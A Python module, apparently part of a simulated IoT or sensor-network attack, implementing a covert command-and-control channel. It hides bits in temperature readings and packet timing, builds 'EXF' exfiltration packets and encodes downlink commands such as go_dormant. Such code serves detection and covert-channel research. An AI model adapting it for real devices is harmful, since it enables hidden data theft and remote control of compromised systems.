"""
CovertChannel: Bidirectional C2 backdoor communication implementation

This module implements a dual-channel covert backdoor supporting both:
1. Uplink: Attacker → Cloud (beacons, data exfiltration)
2. Downlink: Cloud → Attacker (commands, control)

Encoding techniques:
- LSB steganography in temperature sensor readings
- Timing modulation (inter-packet delays encode bits)
- Random padding to prevent fingerprinting
"""

import struct
import random
from Config import Config

class CovertChannel:
    """
    Implements bidirectional covert channel with LSB encoding and timing modulation.

    The channel encodes a repeating bit pattern using:
    - LSB manipulation of temperature values
    - Variable inter-packet delays (0 → no delay, 1 → +delta)
    """

    def __init__(self, bitstring: str, timing_delta: float):
        """
        Initialize covert channel encoder/decoder.

        Args:
            bitstring: Binary pattern to transmit (e.g., "10110011")
            timing_delta: Additional delay (seconds) for encoding bit=1
        """
        self.bits = bitstring if bitstring else "1"
        self.idx = 0
        self.dt = max(0.0, float(timing_delta))

    def encode_lsb(self, value: float, data: int) -> float:
        """
        Encode 1 bit into the LSB of a temperature value.

        Args:
            value: Original temperature reading
            data: Bit to encode (0 or 1)

        Returns:
            Modified temperature with encoded bit in fractional LSB
        """
        int_part = int(value)
        frac_part = value - int_part
        new_frac = (int(round(frac_part * 100)) & 0xFE) | (data & 1)
        return int_part + (new_frac / 100)

    def decode_lsb(self, value: float) -> int:
        """
        Extract 1 bit from a temperature value's LSB.

        Args:
            value: Encoded temperature reading

        Returns:
            Decoded bit (0 or 1)
        """
        frac_part = value - int(value)
        return int(round(frac_part * 100)) & 1

    def build_payload(self, node, data_bytes: bytes, is_beacon: bool = False) -> bytes:
        """
        Build C2 uplink payload with header and encoded data.

        Packet structure:
        - 3-byte magic: "EXF"
        - 1-byte node ID
        - 1-byte flags (attack_triggered, parity, beacon)
        - 4-byte float: LSB-encoded temperature
        - 2-byte length
        - Variable data payload (padded with random bytes)

        Args:
            node: Source sensor node
            data_bytes: Raw data to exfiltrate
            is_beacon: True for beacon packets, False for data exfiltration

        Returns:
            Constructed C2 packet (padded to PKT_SIZE)
        """
        flags = 0
        flags |= 0x01 if getattr(node, "attack_triggered", False) else 0
        flags |= ((node.id & 1) << 1)
        if is_beacon:
            flags |= 0x80

        current_bit = int(self.bits[self.idx % len(self.bits)])
        temp_encoded = self.encode_lsb(node.current_temp, current_bit)

        hdr = b"EXF" + bytes([node.id & 0xFF, flags]) + struct.pack("<fH", float(temp_encoded), len(data_bytes))

        pad_to = max(1, int(getattr(Config, "PKT_SIZE", 128)))
        max_bytes = int(getattr(Config, "C2_MAX_BYTES", pad_to))
        body = data_bytes[:max_bytes]

        if len(body) < pad_to:
            body += bytes([random.randint(0, 255) for _ in range(pad_to - len(body))])
        return hdr + body[:pad_to]

    def next_delay(self) -> float:
        """
        Get timing delay for current bit in sequence.

        Returns:
            0.0 if current bit is 0, timing_delta if current bit is 1
        """
        bit = int(self.bits[self.idx % len(self.bits)])
        self.idx += 1
        return self.dt if bit else 0.0

    def build_command_payload(self, target_node_id: int, command_type: str) -> bytes:
        """
        Build downlink C2 command packet (Cloud → Attacker).

        Supported commands:
        - 'increase_exfil': Speed up data exfiltration rate
        - 'decrease_exfil': Slow down data exfiltration rate
        - 'go_dormant': Pause all C2 activity
        - 'resume': Resume C2 activity
        - 'change_pattern': Switch to different covert bit pattern

        Packet structure:
        - 3-byte magic: "CMD"
        - 2-byte target node ID
        - 1-byte command code
        - 1-byte flags (0x80 = downlink)
        - Padding to standard command size

        Args:
            target_node_id: ID of attacker node to command
            command_type: Command string (see above)

        Returns:
            Constructed command packet
        """
        cmd_map = {
            'increase_exfil': 0x01,
            'decrease_exfil': 0x02,
            'go_dormant': 0x03,
            'resume': 0x04,
            'change_pattern': 0x05
        }
        cmd_code = cmd_map.get(command_type, 0x00)
        flags = 0x80

        current_bit = int(self.bits[self.idx % len(self.bits)])

        hdr = b"CMD" + struct.pack("<HBB", target_node_id, cmd_code, flags)

        pad_size = max(32, int(getattr(Config, "PKT_SIZE", 128) // 4))
        if len(hdr) < pad_size:
            hdr += bytes([0x00]) * (pad_size - len(hdr))

        return hdr[:pad_size]

    def decode_command(self, payload: bytes) -> tuple:
        """
        Decode downlink C2 command packet.

        Args:
            payload: Raw command packet bytes

        Returns:
            Tuple of (target_id, command_type, success)
            Returns (-1, None, False) if packet is invalid
        """
        if len(payload) < 7 or payload[:3] != b"CMD":
            return (-1, None, False)

        target_id = struct.unpack("<H", payload[3:5])[0]
        cmd_code = payload[5]
        flags = payload[6]

        cmd_map_rev = {
            0x01: 'increase_exfil',
            0x02: 'decrease_exfil',
            0x03: 'go_dormant',
            0x04: 'resume',
            0x05: 'change_pattern'
        }

        cmd_type = cmd_map_rev.get(cmd_code, 'unknown')
        return (target_id, cmd_type, True)
